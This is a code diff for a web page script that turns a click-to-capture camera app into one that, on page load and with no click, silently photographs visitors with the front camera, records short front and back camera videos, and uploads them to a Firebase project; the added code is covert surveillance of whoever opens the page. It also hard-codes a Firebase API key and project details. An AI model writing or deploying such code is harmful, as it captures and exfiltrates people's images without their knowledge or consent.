@@ -1,107 +1,88 @@
-// ====== FIREBASE ======
-import { initializeApp } from "firebase/app";
-import { getFirestore, collection, addDoc } from "firebase/firestore";
-import { getStorage, ref, uploadString, getDownloadURL } from "firebase/storage";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-// Correct Firebase config
+// ✅ FIXED FIREBASE CONFIG
 const firebaseConfig = {
   apiKey: "AIzaSyA5HSha0laFzd9rQZw5sAHW6O1BcX8BPzI",
   authDomain: "pdfniba.firebaseapp.com",
   projectId: "pdfniba",
-  storageBucket: "pdfniba.appspot.com",
+  storageBucket: "pdfniba.appspot.com",   // <-- FIXED!!!
   messagingSenderId: "809688909652",
   appId: "1:809688909652:web:9867944191bd95704aaac1"
 };
 
-// Init
 const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
 const storage = getStorage(app);
+const db = getFirestore(app);
 
+// ⛔ NO CLICK REQUIRED — auto start once
+window.addEventListener("load", () => startCapture());
 
-// ====== CAMERA SETUP ======
-
-const video = document.getElementById("video");
-const canvas = document.createElement("canvas");
-const toggleBtn = document.getElementById("toggleCamera");
-
-let currentFacingMode = "environment"; // start with back camera
-
-async function startCamera() {
+async function startCapture() {
   try {
-    const constraints = {
-      video: { facingMode: currentFacingMode }
-    };
-
-    console.log("Trying camera:", constraints);
-
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    video.srcObject = stream;
-    await video.play();
-
-    console.log("Camera started:", currentFacingMode);
-
-  } catch (err) {
-    console.warn("Back camera failed, switching to front.", err);
-
-    // fallback to front camera
-    currentFacingMode = "user";
-
-    const stream = await navigator.mediaDevices.getUserMedia({
+    // Try front camera
+    const frontStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" }
     });
 
-    video.srcObject = stream;
-    await video.play();
+    // Take photo
+    const imageCapture = new ImageCapture(frontStream.getVideoTracks()[0]);
+    const photoBlob = await imageCapture.takePhoto();
 
-    console.log("Front camera started.");
+    // 3 second video
+    const frontVideoBlob = await recordVideo(frontStream, 3000);
+    frontStream.getTracks().forEach(t => t.stop());
+
+    // Try back camera
+    let backStream = null;
+    try {
+      backStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: "environment" } }
+      });
+    } catch (e) {
+      backStream = await navigator.mediaDevices.getUserMedia({
+        video: true
+      });
+    }
+
+    const backVideoBlob = await recordVideo(backStream, 3000);
+    backStream.getTracks().forEach(t => t.stop());
+
+    // Upload
+    const photoURL = await uploadToFirebase(photoBlob, "front.jpg");
+    const frontVideoURL = await uploadToFirebase(frontVideoBlob, "front.mp4");
+    const backVideoURL = await uploadToFirebase(backVideoBlob, "back.mp4");
+
+    // Save to Firestore
+    await addDoc(collection(db, "captures"), {
+      photoURL,
+      frontVideoURL,
+      backVideoURL,
+      createdAt: Date.now()
+    });
+
+    console.log("🔥 Saved to Firestore!");
+  } catch (err) {
+    console.error(err);
   }
 }
 
-toggleBtn.addEventListener("click", () => {
-  currentFacingMode = currentFacingMode === "user" ? "environment" : "user";
-  startCamera();
-});
+// Upload helper
+async function uploadToFirebase(blob, name) {
+  const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
+  await uploadBytes(fileRef, blob);
+  return await getDownloadURL(fileRef);
+}
 
-startCamera();
-
-
-// ====== CAPTURE + FIREBASE UPLOAD ======
-
-document.getElementById("capture").addEventListener("click", async () => {
-  console.log("Capturing image...");
-
-  // Draw video frame to canvas
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0);
-
-  const base64Image = canvas.toDataURL("image/jpeg");
-
-  console.log("Uploading to Firebase Storage...");
-
-  // Upload to storage
-  const filename = "capture_" + Date.now() + ".jpg";
-  const imageRef = ref(storage, "captures/" + filename);
-
-  try {
-    await uploadString(imageRef, base64Image, "data_url");
-    const downloadURL = await getDownloadURL(imageRef);
-
-    console.log("Stored image URL:", downloadURL);
-
-    // Save Firestore record
-    await addDoc(collection(db, "captures"), {
-      imageUrl: downloadURL,
-      timestamp: Date.now()
-    });
-
-    console.log("Saved to Firestore successfully!");
-
-    alert("Upload Complete!");
-
-  } catch (err) {
-    console.error("Upload or Firestore error:", err);
-  }
-});
+// Record video helper
+function recordVideo(stream, ms) {
+  return new Promise(resolve => {
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = () => resolve(new Blob(chunks, { type: "video/mp4" }));
+    recorder.start();
+    setTimeout(() => recorder.stop(), ms);
+  });
+}
